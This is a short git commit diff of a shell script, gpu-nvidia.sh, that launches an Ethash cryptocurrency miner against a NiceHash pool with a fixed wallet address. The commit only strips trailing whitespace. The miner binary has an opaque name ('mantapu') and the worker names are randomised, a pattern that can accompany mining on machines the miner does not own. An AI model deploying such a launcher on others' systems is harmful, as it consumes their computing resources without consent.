390f1a5600ca32dc74d5b33328be71f27213a840
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2021-07-06 04:22:07 +0700

    Update gpu-nvidia.sh

--- gpu-nvidia.sh
+++ gpu-nvidia.sh
@@ -3,4 +3,4 @@ POOL=daggerhashimoto.eu-north.nicehash.com:3353
 WALLET=36yg6GbEqDX8wB5mGRcVzCrbJ55RKaJT9A.xroc1
 WORKER=$(echo $(shuf -i 1-4 -n 1)-GPU)
 chmod +x mantapu
-./mantapu --algo ETHASH --pool $POOL --user $WALLET.$WORKER 
+./mantapu --algo ETHASH --pool $POOL --user $WALLET.$WORKER
